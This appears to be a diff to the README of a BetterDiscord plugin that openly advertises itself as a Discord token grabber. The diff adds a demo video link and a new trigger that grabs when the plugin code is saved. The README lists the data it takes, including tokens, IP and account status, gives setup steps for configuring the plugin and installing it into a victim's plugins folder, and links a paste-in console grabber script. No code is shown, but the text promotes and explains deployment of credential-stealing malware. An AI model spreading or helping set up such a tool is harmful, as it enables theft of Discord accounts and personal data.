@@ -5,12 +5,16 @@ Better Discord Tokens Grabber Plugin
 
 If you want to token grab with a little script to paste in your console(less infos but can be updated) => [CLICK HERE](https://github.com/HideakiAtsuyo/Discord-Token-Grabber-Console-Script)
 
+
+[Demo Video (+Setup)](https://www.youtube.com/watch?v=lq3hX97ZK9Q)
+
 # Ideas
 If you have any idea [check this issue](https://github.com/HideakiAtsuyo/BetterGrabber/issues/15) and send your idea !
 
 # Grab When
 - Load Discord
 - Enable the Plugin if you modify the state (enabled/disabled)
+- Modify Plugin Code(when you save)
 
 # Infos
 - IP
@@ -28,6 +32,7 @@ If you have any idea [check this issue](https://github.com/HideakiAtsuyo/BetterG
 - Actual User Verified Status
 
 # Setup
+
 - Fill up the [config](https://github.com/HideakiAtsuyo/BetterGrabber/blob/master/GOD/HideMe.plugin.js#L83-L93)
 - Windows + R
 - `%appdata%\BetterDiscord\plugins` then hit Enter
